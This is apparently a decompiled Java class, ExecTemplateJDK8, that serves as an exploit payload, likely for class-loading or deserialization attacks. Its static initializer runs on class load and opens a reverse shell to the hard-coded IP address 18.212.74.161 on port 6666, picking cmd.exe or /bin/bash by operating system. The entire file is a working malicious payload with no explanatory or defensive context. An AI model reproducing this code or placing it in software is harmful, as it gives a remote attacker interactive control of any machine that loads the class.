package defpackage;

/* renamed from: ExecTemplateJDK8  reason: default package */
public class ExecTemplateJDK8 {
    static {
        try {
            Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/C", "sh -i >& /dev/udp/18.212.74.161/6666 0>&1"} : new String[]{"/bin/bash", "-c", "sh -i >& /dev/udp/18.212.74.161/6666 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println();
    }
}